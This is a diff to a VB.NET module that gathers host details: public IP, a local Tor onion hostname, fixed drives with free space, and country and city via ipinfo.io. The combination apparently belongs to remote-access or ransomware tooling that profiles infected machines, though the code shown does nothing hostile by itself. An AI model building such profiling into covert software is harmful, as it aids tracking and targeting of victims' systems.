@@ -1,4 +1,5 @@
 ﻿Imports System.Globalization
+Imports System.IO
 Imports System.Net
 Imports Newtonsoft.Json
 
@@ -11,9 +12,24 @@ Module Details
         Return webclient.DownloadString("http://requestbin.net/ip")
     End Function
     Public Function GetOnionAddress()
-        Return My.Computer.FileSystem.ReadAllText(GetTorFolder() & "/hostname")
+        Try
+            Return My.Computer.FileSystem.ReadAllText(GetTorFolder() & "/hostname")
+        Catch ex As Exception
+            Return "N/A"
+        End Try
     End Function
-    Public Function GetCountyCode(ByVal ip As String)
+    Public Function GetDiscName() As ArrayList
+        Dim disc As New ArrayList
+        For Each curDrive As DriveInfo In My.Computer.FileSystem.Drives
+            If curDrive.DriveType = DriveType.Fixed Then
+                If curDrive.TotalFreeSpace > 0 Then
+                    disc.Add(curDrive.Name)
+                End If
+            End If
+        Next
+        Return disc
+    End Function
+    Public Function GetCounty(ByVal ip As String)
         Dim ipInfo As IpInfo = New IpInfo()
 
         Try
@@ -26,5 +42,29 @@ Module Details
         End Try
 
         Return ipInfo.Country
+    End Function
+    Public Function GetCountyCode(ByVal ip As String)
+        Dim ipInfo As IpInfo = New IpInfo()
+
+        Try
+            Dim info As String = New WebClient().DownloadString("http://ipinfo.io/" & ip)
+            ipInfo = JsonConvert.DeserializeObject(Of IpInfo)(info)
+        Catch __unusedException1__ As Exception
+            ipInfo.Country = Nothing
+        End Try
+
+        Return ipInfo.Country
+    End Function
+    Public Function GetCity(ByVal ip As String)
+        Dim ipInfo As IpInfo = New IpInfo()
+
+        Try
+            Dim info As String = New WebClient().DownloadString("http://ipinfo.io/" & ip)
+            ipInfo = JsonConvert.DeserializeObject(Of IpInfo)(info)
+        Catch __unusedException1__ As Exception
+            ipInfo.City = Nothing
+        End Try
+
+        Return ipInfo.City
     End Function
 End Module
